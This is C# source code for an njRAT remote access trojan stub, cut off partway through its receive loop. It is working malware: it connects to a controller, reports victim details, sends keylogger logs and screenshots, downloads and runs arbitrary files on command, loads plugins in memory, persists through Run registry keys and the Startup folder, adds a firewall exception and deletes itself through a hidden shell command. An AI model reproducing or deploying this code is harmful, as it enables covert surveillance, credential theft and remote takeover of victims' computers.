using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace Lime
{
    /*
     * │ Author       : NYAN CAT
     * │ Name         : njRAT C# Stub
     * │ Contact      : https:github.com/NYAN-x-CAT
     * 
     * This program is distributed for educational purposes only.
     */

    public class Core
	{
        public static string VictimName = "TllBTiBDQVQ=";

        public static string Version = "0.7d";

        public static object StubMutex = null;

        public static string StubName = "server.exe";

        public static string DropFolder = "TEMP";

        public static string RG = "165d6ed988ac1dbec1627a1ca9899d84";

        public static string Host = "127.0.0.1";

        public static string Port = "5552";

        public static string Splitter = "|'|'|";

        public static bool BD = Conversions.ToBoolean("False");

        public static bool Idr = Conversions.ToBoolean("False");

        public static bool IsF = Conversions.ToBoolean("False");

        public static bool Isu = Conversions.ToBoolean("False");

        public static FileInfo CurrentAssemblyFileInfo = new FileInfo(Application.ExecutablePath);

        public static FileStream FS;

        public static Computer _Computer = new Computer();

        public static Keylogger _Keylogger = null;

        public static bool IsConnected = false;

        public static string sf = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

        public static TcpClient TcpSocket = null;

        private static MemoryStream _MemoryStream = new MemoryStream();

        private static byte[] BytesArray = new byte[5121];

        private static string LastCapturedImage = "";

        public static object CurrentPlugin = null;


        public static void DeleteValueFromRegistry(string name)
		{
			try
			{
				_Computer.Registry.CurrentUser.OpenSubKey("Software\\" + RG, true).DeleteValue(name);
			}
			catch (Exception expr_2C)
			{
				ProjectData.SetProjectError(expr_2C);
				ProjectData.ClearProjectError();
			}
		}

		public static object GetValueFromRegistry(string name, object ret)
		{
			object result;
			try
			{
				result = _Computer.Registry.CurrentUser.OpenSubKey("Software\\" + RG).GetValue(name, RuntimeHelpers.GetObjectValue(ret));
			}
			catch (Exception expr_32)
			{
				ProjectData.SetProjectError(expr_32);
				result = ret;
				ProjectData.ClearProjectError();
			}
			return result;
		}

		public static bool SaveValueOnRegistry(string n, object t, RegistryValueKind typ)
		{
			bool result;
			try
			{
				_Computer.Registry.CurrentUser.CreateSubKey("Software\\" + RG).SetValue(n, RuntimeHelpers.GetObjectValue(t), typ);
				result = true;
			}
			catch (Exception expr_34)
			{
				ProjectData.SetProjectError(expr_34);
				result = false;
				ProjectData.ClearProjectError();
			}
			return result;
		}

		public static string GetInfo()
		{
			string text = "ll" + Splitter;
			try
			{
				if (Operators.ConditionalCompareObjectEqual(GetValueFromRegistry("vn", ""), "", false))
				{
					string arg_54_0 = text;
					string text2 = Base64ToString(ref VictimName) + "_" + GetHWID();
					text = arg_54_0 + StringToBase64(ref text2) + Splitter;
				}
				else
				{
					string arg_97_0 = text;
					string text2 = Conversions.ToString(GetValueFromRegistry("vn", ""));
					string text3 = Base64ToString(ref text2) + "_" + GetHWID();
					text = arg_97_0 + StringToBase64(ref text3) + Splitter;
				}
			}
			catch (Exception expr_9F)
			{
				ProjectData.SetProjectError(expr_9F);
				string arg_BA_0 = text;
				string text3 = GetHWID();
				text = arg_BA_0 + StringToBase64(ref text3) + Splitter;
				ProjectData.ClearProjectError();
			}
			try
			{
				text = text + Environment.MachineName + Splitter;
			}
			catch (Exception expr_DA)
			{
				ProjectData.SetProjectError(expr_DA);
				text = text + "??" + Splitter;
				ProjectData.ClearProjectError();
			}
			try
			{
				text = text + Environment.UserName + Splitter;
			}
			catch (Exception expr_10D)
			{
				ProjectData.SetProjectError(expr_10D);
				text = text + "??" + Splitter;
				ProjectData.ClearProjectError();
			}
			try
			{
				text = text + CurrentAssemblyFileInfo.LastWriteTime.Date.ToString("yy-MM-dd") + Splitter;
			}
			catch (Exception expr_15C)
			{
				ProjectData.SetProjectError(expr_15C);
				text = text + "??-??-??" + Splitter;
				ProjectData.ClearProjectError();
			}
			text = text + "" + Splitter;
			try
			{
				text += _Computer.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
			}
			catch (Exception expr_1FF)
			{
				ProjectData.SetProjectError(expr_1FF);
				text += "??";
				ProjectData.ClearProjectError();
			}
			text += "SP";
			checked
			{
				try
				{
					string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, CompareMethod.Binary);
					if (array.Length == 1)
					{
						text += "0";
					}
					text += array[array.Length - 1];
				}
				catch (Exception expr_263)
				{
					ProjectData.SetProjectError(expr_263);
					text += "0";
					ProjectData.ClearProjectError();
				}
				try
				{
					if (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86"))
					{
						text = text + " x64" + Splitter;
					}
					else
					{
						text = text + " x86" + Splitter;
					}
				}
				catch (Exception expr_2B7)
				{
					ProjectData.SetProjectError(expr_2B7);
					text += Splitter;
					ProjectData.ClearProjectError();
				}
				if (SearchForCam())
				{
					text = text + "Yes" + Splitter;
				}
				else
				{
					text = text + "No" + Splitter;
				}
				text = text + Version + Splitter;
				text = text + ".." + Splitter;
				text = text + GetForegroundWindowTitle() + Splitter;
				string text4 = "";
				try
				{
					string[] valueNames = _Computer.Registry.CurrentUser.CreateSubKey("Software\\" + RG, RegistryKeyPermissionCheck.Default).GetValueNames();
					for (int i = 0; i < valueNames.Length; i++)
					{
						string text5 = valueNames[i];
						if (text5.Length == 32)
						{
							text4 = text4 + text5 + ",";
						}
					}
				}
				catch (Exception expr_396)
				{
					ProjectData.SetProjectError(expr_396);
					ProjectData.ClearProjectError();
				}
				return text + text4;
			}
		}

		public static string StringToBase64(ref string s)
		{
			return Convert.ToBase64String(StringToBytes(ref s));
		}

		public static string Base64ToString(ref string s)
		{
			byte[] array = Convert.FromBase64String(s);
			return BytesToString(ref array);
		}

		public static byte[] StringToBytes(ref string S)
		{
			return Encoding.UTF8.GetBytes(S);
		}

		public static string BytesToString(ref byte[] B)
		{
			return Encoding.UTF8.GetString(B);
		}

		public static byte[] DecompressGzip(byte[] B)
		{
			MemoryStream memoryStream = new MemoryStream(B);
			GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
			byte[] array = new byte[4];
			checked
			{
				memoryStream.Position = memoryStream.Length - 5L;
				memoryStream.Read(array, 0, 4);
				int num = BitConverter.ToInt32(array, 0);
				memoryStream.Position = 0L;
				byte[] array2 = new byte[num - 1 + 1];
				gZipStream.Read(array2, 0, num);
				gZipStream.Dispose();
				memoryStream.Dispose();
				return array2;
			}
		}

		public static bool SearchForCam()
		{
			checked
			{
				try
				{
					int num = 0;
					while (true)
					{
						short arg_17_0 = (short)num;
						string text = Strings.Space(100);
						int arg_17_2 = 100;
						string text2 = null;
						if (capGetDriverDescriptionA(arg_17_0, ref text, arg_17_2, ref text2, 100))
						{
							break;
						}
						num++;
						if (num > 4)
						{
							goto Block_3;
						}
					}
					return true;
					Block_3:;
				}
				catch (Exception expr_2C)
				{
					ProjectData.SetProjectError(expr_2C);
					ProjectData.ClearProjectError();
				}
				return false;
			}
		}

		public static string GetForegroundWindowTitle()
		{
			string result;
			try
			{
				IntPtr foregroundWindow = GetForegroundWindow();
				if (foregroundWindow == IntPtr.Zero)
				{
					result = "";
				}
				else
				{
					string text = Strings.Space(checked(GetWindowTextLength((long)foregroundWindow) + 1));
					GetWindowText(foregroundWindow, ref text, text.Length);
					result = StringToBase64(ref text);
				}
			}
			catch (Exception expr_47)
			{
				ProjectData.SetProjectError(expr_47);
				result = "";
				ProjectData.ClearProjectError();
			}
			return result;
		}

		public static string GetHWID()
		{
			string result;
			try
			{
				string text = Interaction.Environ("SystemDrive") + "\\";
				string text2 = null;
				int arg_2F_2 = 0;
				int num = 0;
				int num2 = 0;
				string text3 = null;
				int number = 0;
				GetVolumeInformation(ref text, ref text2, arg_2F_2, ref number, ref num, ref num2, ref text3, 0);
				result = Conversion.Hex(number);
			}
			catch (Exception expr_3E)
			{
				ProjectData.SetProjectError(expr_3E);
				result = "ERR";
				ProjectData.ClearProjectError();
			}
			return result;
		}

		public static object Plugin(byte[] b, string c)
		{
			Module[] modules = Assembly.Load(b).GetModules();
			checked
			{
				for (int i = 0; i < modules.Length; i++)
				{
					Module module = modules[i];
					Type[] types = module.GetTypes();
					for (int j = 0; j < types.Length; j++)
					{
						Type type = types[j];
						if (type.FullName.EndsWith("." + c))
						{
							return module.Assembly.CreateInstance(type.FullName);
						}
					}
				}
				return null;
			}
		}

		public static void ED()
		{
			pr(0);
		}

		private static bool CompareDirectory(FileInfo F1, FileInfo F2)
		{
			if (Operators.CompareString(F1.Name.ToLower(), F2.Name.ToLower(), false) != 0)
			{
				return false;
			}
			DirectoryInfo directoryInfo = F1.Directory;
			DirectoryInfo directoryInfo2 = F2.Directory;
			while (Operators.CompareString(directoryInfo.Name.ToLower(), directoryInfo2.Name.ToLower(), false) == 0)
			{
				directoryInfo = directoryInfo.Parent;
				directoryInfo2 = directoryInfo2.Parent;
				if (directoryInfo == null & directoryInfo2 == null)
				{
					return true;
				}
				if (directoryInfo == null)
				{
					return false;
				}
				if (directoryInfo2 == null)
				{
					return false;
				}
			}
			return false;
		}

		public static void Uninstall()
		{
			pr(0);
			Isu = false;
			try
			{
				_Computer.Registry.CurrentUser.OpenSubKey(sf, true).DeleteValue(RG, false);
			}
			catch (Exception expr_33)
			{
				ProjectData.SetProjectError(expr_33);
				ProjectData.ClearProjectError();
			}
			try
			{
				_Computer.Registry.LocalMachine.OpenSubKey(sf, true).DeleteValue(RG, false);
			}
			catch (Exception expr_68)
			{
				ProjectData.SetProjectError(expr_68);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell("netsh firewall delete allowedprogram \"" + CurrentAssemblyFileInfo.FullName + "\"", AppWinStyle.Hide, false, -1);
			}
			catch (Exception expr_9A)
			{
				ProjectData.SetProjectError(expr_9A);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (FS != null)
				{
					FS.Dispose();
					File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe");
				}
			}
			catch (Exception expr_DA)
			{
				ProjectData.SetProjectError(expr_DA);
				ProjectData.ClearProjectError();
			}
			try
			{
				_Computer.Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(RG, false);
			}
			catch (Exception expr_10F)
			{
				ProjectData.SetProjectError(expr_10F);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + CurrentAssemblyFileInfo.FullName + "\"", AppWinStyle.Hide, false, -1);
			}
			catch (Exception expr_142)
			{
				ProjectData.SetProjectError(expr_142);
				ProjectData.ClearProjectError();
			}
			ProjectData.EndApp();
		}

		public static void Install()
		{
			Thread.Sleep(1000);
			if (Idr)
			{
				if (!CompareDirectory(CurrentAssemblyFileInfo, new FileInfo(Interaction.Environ(DropFolder).ToLower() + "\\" + StubName.ToLower())))
				{
					try
					{
						if (File.Exists(Interaction.Environ(DropFolder) + "\\" + StubName))
						{
							File.Delete(Interaction.Environ(DropFolder) + "\\" + StubName);
						}
						FileStream fileStream = new FileStream(Interaction.Environ(DropFolder) + "\\" + StubName, FileMode.CreateNew);
						byte[] array = File.ReadAllBytes(CurrentAssemblyFileInfo.FullName);
						fileStream.Write(array, 0, array.Length);
						fileStream.Flush();
						fileStream.Close();
						CurrentAssemblyFileInfo = new FileInfo(Interaction.Environ(DropFolder) + "\\" + StubName);
						Process.Start(CurrentAssemblyFileInfo.FullName);
						ProjectData.EndApp();
					}
					catch (Exception expr_10C)
					{
						ProjectData.SetProjectError(expr_10C);
						ProjectData.EndApp();
						ProjectData.ClearProjectError();
					}
				}
			}
			try
			{
				Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
			}
			catch (Exception expr_131)
			{
				ProjectData.SetProjectError(expr_131);
				ProjectData.ClearProjectError();
			}
			try
			{
				Interaction.Shell(string.Concat(new string[]
				{
					"netsh firewall add allowedprogram \"",
					CurrentAssemblyFileInfo.FullName,
					"\" \"",
					CurrentAssemblyFileInfo.Name,
					"\" ENABLE"
				}), AppWinStyle.Hide, true, 5000);
			}
			catch (Exception expr_194)
			{
				ProjectData.SetProjectError(expr_194);
				ProjectData.ClearProjectError();
			}
			if (Isu)
			{
				try
				{
					_Computer.Registry.CurrentUser.OpenSubKey(sf, true).SetValue(RG, "\"" + CurrentAssemblyFileInfo.FullName + "\" ..");
				}
				catch (Exception expr_1EC)
				{
					ProjectData.SetProjectError(expr_1EC);
					ProjectData.ClearProjectError();
				}
				try
				{
					_Computer.Registry.LocalMachine.OpenSubKey(sf, true).SetValue(RG, "\"" + CurrentAssemblyFileInfo.FullName + "\" ..");
				}
				catch (Exception expr_23A)
				{
					ProjectData.SetProjectError(expr_23A);
					ProjectData.ClearProjectError();
				}
			}
			if (IsF)
			{
				try
				{
					File.Copy(CurrentAssemblyFileInfo.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe", true);
					FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe", FileMode.Open);
				}
				catch (Exception expr_2A1)
				{
					ProjectData.SetProjectError(expr_2A1);
					ProjectData.ClearProjectError();
				}
			}
		}

		public static void HandleData(byte[] b)
		{
			string[] array = Strings.Split(BytesToString(ref b), Splitter, -1, CompareMethod.Binary);
			checked
			{
				try
				{
					string left = array[0];
					if (Operators.CompareString(left, "ll", false) == 0)
					{
						IsConnected = false;
					}
					else if (Operators.CompareString(left, "kl", false) == 0)
					{
						Send("kl" + Splitter + StringToBase64(ref _Keylogger.Logs));
					}
					else if (Operators.CompareString(left, "prof", false) == 0)
					{
						string left2 = array[1];
						if (Operators.CompareString(left2, "~", false) == 0)
						{
							SaveValueOnRegistry(array[2], array[3], RegistryValueKind.String);
						}
						else if (Operators.CompareString(left2, "!", false) == 0)
						{
							SaveValueOnRegistry(array[2], array[3], RegistryValueKind.String);
							Send(Conversions.ToString(Operators.ConcatenateObject("getvalue" + Splitter + array[1] + Splitter, GetValueFromRegistry(array[1], ""))));
						}
						else if (Operators.CompareString(left2, "@", false) == 0)
						{
							DeleteValueFromRegistry(array[2]);
						}
					}
					else
					{
						if (Operators.CompareString(left, "rn", false) == 0)
						{
							byte[] bytes;
							if (array[2][0] == '\u001f')
							{
								try
								{
									MemoryStream memoryStream = new MemoryStream();
									int length = (array[0] + Splitter + array[1] + Splitter).Length;
									memoryStream.Write(b, length, b.Length - length);
									bytes = DecompressGzip(memoryStream.ToArray());
									goto IL_20B;
								}
								catch (Exception expr_189)
								{
									ProjectData.SetProjectError(expr_189);
									Send("MSG" + Splitter + "Execute ERROR");
									Send("bla");
									ProjectData.ClearProjectError();
									return;
								}
							}
							WebClient webClient = new WebClient();
							try
							{
								bytes = webClient.DownloadData(array[2]);
							}
							catch (Exception expr_1D4)
							{
								ProjectData.SetProjectError(expr_1D4);
								Send("MSG" + Splitter + "Download ERROR");
								Send("bla");
								ProjectData.ClearProjectError();
								return;
							}
							IL_20B:
							Send("bla");
							string text = Path.GetTempFileName() + "." + array[1];
							try
							{
								File.WriteAllBytes(text, bytes);
								Process.Start(text);
								Send("MSG" + Splitter + "Executed As " + new FileInfo(text).Name);
								return;
							}
							catch (Exception expr_261)
							{
								ProjectData.SetProjectError(expr_261);
								Exception ex = expr_261;
								Send("MSG" + Splitter + "Execute ERROR " + ex.Message);
								ProjectData.ClearProjectError();
								return;
							}
						}
						if (Operators.CompareString(left, "inv", false) == 0)
						{
							byte[] array2 = (byte[])GetValueFromRegistry(array[1], new byte[0]);
							if (array[3].Length < 10 & array2.Length == 0)
							{
								Send(string.Concat(new string[]
								{
									"pl",
									Splitter,
									array[1],
									Splitter,
									Conversions.ToString(1)
								}));
							}
							else
							{
								if (array[3].Length > 10)
								{
									MemoryStream memoryStream2 = new MemoryStream();
									int length2 = string.Concat(new string[]
									{
										array[0],
										Splitter,
										array[1],
										Splitter,
										array[2],
										Splitter
									}).Length;
									memoryStream2.Write(b, length2, b.Length - length2);
									array2 = DecompressGzip(memoryStream2.ToArray());
									SaveValueOnRegistry(array[1], array2, RegistryValueKind.Binary);
								}
								Send(string.Concat(new string[]
								{
									"pl",
									Splitter,
									array[1],
									Splitter,
									Conversions.ToString(0)
								}));
								object objectValue = RuntimeHelpers.GetObjectValue(Plugin(array2, "A"));
								NewLateBinding.LateSet(objectValue, null, "h", new object[]
								{
									Host
								}, null, null);
								NewLateBinding.LateSet(objectValue, null, "p", new object[]
								{
									Port
								}, null, null);
								NewLateBinding.LateSet(objectValue, null, "osk", new object[]
								{
									array[2]
								}, null, null);
								NewLateBinding.LateCall(objectValue, null, "start", new object[0], null, null, null, true);
								while (!Conversions.ToBoolean(Operators.OrObject(!IsConnected, Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, null, "Off", new object[0], null, null, null), true, false))))
								{
									Thread.Sleep(1);
								}
								NewLateBinding.LateSet(objectValue, null, "off", new object[]
								{
									true
								}, null, null);
							}
						}
						else if (Operators.CompareString(left, "ret", false) == 0)
						{
							byte[] array3 = (byte[])GetValueFromRegistry(array[1], new byte[0]);
							if (array[2].Length < 10 & array3.Length == 0)
							{
								Send(string.Concat(new string[]
								{
									"pl",
									Splitter,
									array[1],
									Splitter,
									Conversions.ToString(1)
								}));
							}
							else
							{
								if (array[2].Length > 10)
								{
									MemoryStream memoryStream3 = new MemoryStream();
									int length3 = (array[0] + Splitter + array[1] + Splitter).Length;
									memoryStream3.Write(b, length3, b.Length - length3);
									array3 = DecompressGzip(memoryStream3.ToArray());
									SaveValueOnRegistry(array[1], array3, RegistryValueKind.Binary);
								}
								Send(string.Concat(new string[]
								{
									"pl",
									Splitter,
									array[1],
									Splitter,
									Conversions.ToString(0)
								}));
								object objectValue2 = RuntimeHelpers.GetObjectValue(Plugin(array3, "A"));
								string[] array4 = new string[5];
								array4[0] = "ret";
								array4[1] = Splitter;
								array4[2] = array[1];
								array4[3] = Splitter;
								string[] arg_658_0 = array4;
								int arg_658_1 = 4;
								string text2 = Conversions.ToString(NewLateBinding.LateGet(objectValue2, null, "GT", new object[0], null, null, null));
								arg_658_0[arg_658_1] = StringToBase64(ref text2);
								Send(string.Concat(array4));
							}
						}
						else if (Operators.CompareString(left, "CAP", false) == 0)
						{
							int arg_6A9_0 = Screen.PrimaryScreen.Bounds.Width;
							Rectangle bounds = Screen.PrimaryScreen.Bounds;
							Bitmap bitmap = new Bitmap(arg_6A9_0, bounds.Height, PixelFormat.Format16bppRgb555);
							Graphics graphics = Graphics.FromImage(bitmap);
							Graphics arg_6DB_0 = graphics;
							int arg_6DB_1 = 0;
							int arg_6DB_2 = 0;
							int arg_6DB_3 = 0;
							int arg_6DB_4 = 0;
							Size size = new Size(bitmap.Width, bitmap.Height);
							arg_6DB_0.CopyFromScreen(arg_6DB_1, arg_6DB_2, arg_6DB_3, arg_6DB_4, size, CopyPixelOperation.SourceCopy);
							try
							{
								Cursor arg_702_0 = Cursors.Default;
								Graphics arg_702_1 = graphics;
								Point arg_6FB_1 = Cursor.Position;
								size = new Size(32, 32);
								bounds = new Rectangle(arg_6FB_1, size);
								arg_702_0.Draw(arg_702_1, bounds);
							}
							catch (Exception expr_709)
							{
								ProjectData.SetProjectError(expr_709);
								ProjectData.ClearProjectError();
							}
							graphics.Dispose();
							Bitmap bitmap2 = new Bitmap(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
							graphics = Graphics.FromImage(bitmap2);
							graphics.DrawImage(bitmap, 0, 0, bitmap2.Width, bitmap2.Height);
							graphics.Dispose();
							MemoryStream memoryStream4 = new MemoryStream();
							string text2 = "CAP" + Splitter;
							b = StringToBytes(ref text2);
							memoryStream4.Write(b, 0, b.Length);
							MemoryStream memoryStream5 = new MemoryStream();
							bitmap2.Save(memoryStream5, ImageFormat.Jpeg);
							string left3 = CreateHash(memoryStream5.ToArray());
							if (Operators.CompareString(left3, LastCapturedImage, false) != 0)
							{
								LastCapturedImage = left3;
								memoryStream4.Write(memoryStream5.ToArray(), 0, (int)memoryStream5.Length);
							}
							else
							{
								memoryStream4.WriteByte(0);
							}
							Send(memoryStream4.ToArray());
							memoryStream4.Dispose();
							memoryStream5.Dispose();
							bitmap.Dispose();
							bitmap2.Dispose();
						}
						else if (Operators.CompareString(left, "un", false) == 0)
						{
							string left4 = array[1];
							if (Operators.CompareString(left4, "~", false) == 0)
							{
								Uninstall();
							}
							else if (Operators.CompareString(left4, "!", false) == 0)
							{
								pr(0);
								ProjectData.EndApp();
							}
							else if (Operators.CompareString(left4, "@", false) == 0)
							{
								pr(0);
								Process.Start(CurrentAssemblyFileInfo.FullName);
								ProjectData.EndApp();
							}
						}
						else if (Operators.CompareString(left, "up", false) == 0)
						{
							byte[] bytes2 = null;
							if (array[1][0] == '\u001f')
							{
								try
								{
									MemoryStream memoryStream6 = new MemoryStream();
									int length4 = (array[0] + Splitter).Length;
									memoryStream6.Write(b, length4, b.Length - length4);
									bytes2 = DecompressGzip(memoryStream6.ToArray());
									goto IL_97B;
								}
								catch (Exception expr_8F8)
								{
									ProjectData.SetProjectError(expr_8F8);
									Send("MSG" + Splitter + "Update ERROR");
									Send("bla");
									ProjectData.ClearProjectError();
									return;
								}
							}
							WebClient webClient2 = new WebClient();
							try
							{
								bytes2 = webClient2.DownloadData(array[1]);
							}
							catch (Exception expr_944)
							{
								ProjectData.SetProjectError(expr_944);
								Send("MSG" + Splitter + "Update ERROR");
								Send("bla");
								ProjectData.ClearProjectError();
								return;
							}
							IL_97B:
							Send("bla");
							string text3 = Path.GetTempFileName() + ".exe";
							try
							{
								Send("MSG" + Splitter + "Updating To " + new FileInfo(text3).Name);
								Thread.Sleep(2000);
								File.WriteAllBytes(text3, bytes2);
								Process.Start(text3, "..");
							}
							catch (Exception expr_9DF)
							{
								ProjectData.SetProjectError(expr_9DF);
								Exception ex2 = expr_9DF;
								Send("MSG" + Splitter + "Update ERROR " + ex2.Message);
								ProjectData.ClearProjectError();
								return;
							}
							Uninstall();
						}
						else if (Operators.CompareString(left, "Ex", false) == 0)
						{
							if (CurrentPlugin == null)
							{
								Send("PLG");
								int num = 0;
								while (!(CurrentPlugin != null | num == 20 | !IsConnected))
								{
									num++;
									Thread.Sleep(1000);
								}
								if (CurrentPlugin == null | !IsConnected)
								{
									return;
								}
							}
							object arg_ABB_0 = CurrentPlugin;
							Type arg_ABB_1 = null;
							string arg_ABB_2 = "ind";
							object[] array5 = new object[]
							{
								b
							};
							object[] arg_ABB_3 = array5;
							string[] arg_ABB_4 = null;
							Type[] arg_ABB_5 = null;
							bool[] array6 = new bool[]
							{
								true
							};
							NewLateBinding.LateCall(arg_ABB_0, arg_ABB_1, arg_ABB_2, arg_ABB_3, arg_ABB_4, arg_ABB_5, array6, true);
							if (array6[0])
							{
								b = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
							}
						}
						else if (Operators.CompareString(left, "PLG", false) == 0)
						{
							MemoryStream memoryStream7 = new MemoryStream();
							int length5 = (array[0] + Splitter).Length;
							memoryStream7.Write(b, length5, b.Length - length5);
							CurrentPlugin = RuntimeHelpers.GetObjectValue(Plugin(DecompressGzip(memoryStream7.ToArray()), "A"));
							NewLateBinding.LateSet(CurrentPlugin, null, "H", new object[]
							{
								Host
							}, null, null);
							NewLateBinding.LateSet(CurrentPlugin, null, "P", new object[]
							{
								Port
							}, null, null);
							NewLateBinding.LateSet(CurrentPlugin, null, "c", new object[]
							{
								TcpSocket
							}, null, null);
						}
					}
				}
				catch (Exception expr_BC0)
				{
					ProjectData.SetProjectError(expr_BC0);
					Exception ex3 = expr_BC0;
					if (array.Length > 0 && (Operators.CompareString(array[0], "Ex", false) == 0 | Operators.CompareString(array[0], "PLG", false) == 0))
					{
						CurrentPlugin = null;
					}
					try
					{
						Send(string.Concat(new string[]
						{
							"ER",
							Splitter,
							array[0],
							Splitter,
							ex3.Message
						}));
					}
					catch (Exception expr_C3D)
					{
						ProjectData.SetProjectError(expr_C3D);
						ProjectData.ClearProjectError();
					}
					ProjectData.ClearProjectError();
				}
			}
		}

		public static string CreateHash(byte[] B)
		{
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			B = mD5CryptoServiceProvider.ComputeHash(B);
			string text = "";
			byte[] array = B;
			checked
			{
				for (int i = 0; i < array.Length; i++)
				{
					byte b = array[i];
					text += b.ToString("x2");
				}
				return text;
			}
		}

		public static void pr(int i)
		{
			try
			{
				NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
			}
			catch (Exception expr_17)
			{
				ProjectData.SetProjectError(expr_17);
				ProjectData.ClearProjectError();
			}
		}

		public static bool Send(byte[] b)
		{
			if (!IsConnected)
			{
				return false;
			}
			try
			{
				FileInfo lO = CurrentAssemblyFileInfo;
				lock (lO)
				{
					if (!IsConnected)
					{
						return false;
					}
					MemoryStream memoryStream = new MemoryStream();
					string text = b.Length.ToString() + "\0";
					byte[] array = StringToBytes(ref text);
					memoryStream.Write(array, 0, array.Length);
					memoryStream.Write(b, 0, b.Length);
					TcpSocket.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
				}
			}
			catch (Exception expr_8C)
			{
				ProjectData.SetProjectError(expr_8C);
				try
				{
					if (IsConnected)
					{
						IsConnected = false;
						TcpSocket.Close();
					}
				}
				catch (Exception expr_AC)
				{
					ProjectData.SetProjectError(expr_AC);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
			return IsConnected;
		}

		public static bool Send(string S)
		{
			return Send(StringToBytes(ref S));
		}

		public static bool Connect()
		{
			IsConnected = false;
			Thread.Sleep(2000);
			FileInfo lO = CurrentAssemblyFileInfo;
			lock (lO)
			{
				try
				{
					if (TcpSocket != null)
					{
						try
						{
							TcpSocket.Close();
							TcpSocket = null;
						}
						catch (Exception expr_37)
						{
							ProjectData.SetProjectError(expr_37);
							ProjectData.ClearProjectError();
						}
					}
					try
					{
						_MemoryStream.Dispose();
					}
					catch (Exception expr_51)
					{
						ProjectData.SetProjectError(expr_51);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception expr_5F)
				{
					ProjectData.SetProjectError(expr_5F);
					ProjectData.ClearProjectError();
				}
				try
				{
					_MemoryStream = new MemoryStream();
					TcpSocket = new TcpClient();
					TcpSocket.ReceiveBufferSize = 204800;
					TcpSocket.SendBufferSize = 204800;
					TcpSocket.Client.SendTimeout = 10000;
					TcpSocket.Client.ReceiveTimeout = 10000;
					TcpSocket.Connect(Host, Conversions.ToInteger(Port));
					IsConnected = true;
					Send(GetInfo());
					try
					{
						string text = string.Empty;
						if (Operators.ConditionalCompareObjectEqual(GetValueFromRegistry("vn", ""), "", false))
						{
							text = text + Base64ToString(ref VictimName) + "\r\n";
						}
						else
						{
							string arg_14B_0 = text;
							string text2 = Conversions.ToString(GetValueFromRegistry("vn", ""));
							text = arg_14B_0 + Base64ToString(ref text2) + "\r\n";
						}
						text = string.Concat(new string[]
						{
							text,
							Host,
							":",
							Port,
							"\r\n"
						});
						text = text + DropFolder + "\r\n";
						text = text + StubName + "\r\n";
						text = text + Conversions.ToString(Idr) + "\r\n";
						text = text + Conversions.ToString(IsF) + "\r\n";
						text = text + Conversions.ToString(Isu) + "\r\n";
						text += Conversions.ToString(BD);
						Send("inf" + Splitter + StringToBase64(ref text));
					}
					catch (Exception expr_22C)
					{
						ProjectData.SetProjectError(expr_22C);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception expr_23B)
				{
					ProjectData.SetProjectError(expr_23B);
					IsConnected = false;
					ProjectData.ClearProjectError();
				}
			}
			return IsConnected;
		}

		public static void Receive()
		{
			checked
			{
				while (true)
				{
					LastCapturedImage = "";
					if (TcpSocket != null)
					{
						long num = -1L;
						int num2 = 0;
						try
						{
							while (true)
							{
								IL_1B:
								num2++;
								if (num2 == 10)
								{
									num2 = 0;
									Thread.Sleep(1);
								}
								if (!IsConnected)
								{
									break;
								}
								if (TcpSocket.Available < 1)
								{
									TcpSocket.Client.Poll(-1, SelectMode.SelectRead);
								}
								while (TcpSocket.Available != 0)
								{
									if (num != -1L)
									{
										BytesArray = new byte[TcpSocket.Available + 1];
										long num3 = num - _MemoryStream.Length;
										if (unchecked((long)BytesArray.Length) > num3)
										{
											BytesArray = new byte[(int)(num3 - 1L) + 1];
										}
										int count = TcpSocket.Client.Receive(BytesArray, 0, BytesArray.Length, SocketFlags.None);
										_MemoryStream.Write(BytesArray, 0, count);
										if (_MemoryStream.Length == num)
										{
											num = -1L;
											Thread thread = new Thread(delegate(object a0)
											{
												HandleData((byte[])a0);
											}, 1);
											thread.Start(_MemoryStream.ToArray());
											thread.Join(100);
											_MemoryStream.Dispose();
											_MemoryStream = new MemoryStream();
										}
										goto IL_1B;
									}
									string text = "";
									while (true)
									{
										int num4 = TcpSocket.GetStream().ReadByte();
										if (num4 == -1)
										{
											goto Block_9;
										}
										if (num4 == 0)
										{
											break;
										}
										text += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(num4).ToString()));
									}
									num = Conversions.ToLong(text);
									if (num == 0L)
									{
										Send("");
										num = -1L;
									}
									if (TcpSocket.Available <= 0)
									{
										goto IL_1B;
									}
								}
								break;
							}
							Block_9:;
						}
						catch (Exception expr_1B2)
						{
							ProjectData.SetProjectError(expr_1B2);
							ProjectData.ClearProjectError();
						}
					}
					do
					{
						try
						{
							if (CurrentPlugin != null)
							{
